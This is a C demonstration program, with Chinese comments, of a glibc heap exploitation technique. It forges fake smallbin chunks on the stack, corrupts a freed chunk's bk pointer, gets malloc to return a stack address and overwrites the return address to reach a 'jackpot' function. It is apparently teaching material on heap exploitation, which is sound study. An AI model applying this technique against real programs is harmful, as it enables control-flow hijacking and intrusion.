#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

void jackpot()
{
    fprintf(stderr, "Nice jump d00d\n");
    exit(0);
}

int main()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    intptr_t *stack_buffer_1[4] = {0};
    intptr_t *stack_buffer_2[3] = {0};
    void *fake_freelist[7][4] = {0};

    intptr_t *victim = malloc(0x100);

    void *dummies[7];
    for (int i = 0; i < 7; i++)
        dummies[i] = malloc(0x100);

    // 取的 victim_chunk 的位址
    intptr_t *victim_chunk = victim - 2;

    // 在 stack 中建立一個 fake free-list
    for (int i = 0; i < 6; i++)
        fake_freelist[i][3] = fake_freelist[i + 1];
    fake_freelist[6][3] = NULL;

    // fake chunk    
    stack_buffer_1[0] = 0;
    stack_buffer_1[1] = 0;
    stack_buffer_1[2] = victim_chunk; // set fd to 'victim_chunk' in order to bypass small bin corrupted
    stack_buffer_1[3] = (intptr_t *) stack_buffer_2; // set bk to 'stack_buffer_2'

    // set fd to stack_buffer_1 in order to bypass small bin corrupted
    stack_buffer_2[2] = (intptr_t *) stack_buffer_1;

    // set bk to fake free-list to prevent crash
    stack_buffer_2[3] = (intptr_t *) fake_freelist[0];

    void *p5 = malloc(1000);

    for (int i = 0; i < 7; i++)
        free(dummies[i]);
    free(victim); // will be put into unsorted bin

    // victim(0x100) will go to smallbin
    void *p2 = malloc(1200);

    // ! vuln
    // victim is now in smallbin
    victim[1] = (intptr_t) stack_buffer_1; // victim->bk is pointing to stack

    // 清空 tcache
    for (int i = 0; i < 7; i++)
        malloc(0x100);

    void *p3 = malloc(0x100); // 執行後會拿到 victim，並且 trigger smallbin stashing
    char *p4 = malloc(0x100); // 而 p4 會拿到 stack 位址
    
    intptr_t sc = (intptr_t)jackpot;
    long offset = (long)__builtin_frame_address(0) - (long)p4;
    memcpy((p4 + offset + 8), &sc, 8); // bypass canary

    // sanity check
    assert((long)__builtin_return_address(0) == (long)jackpot);
}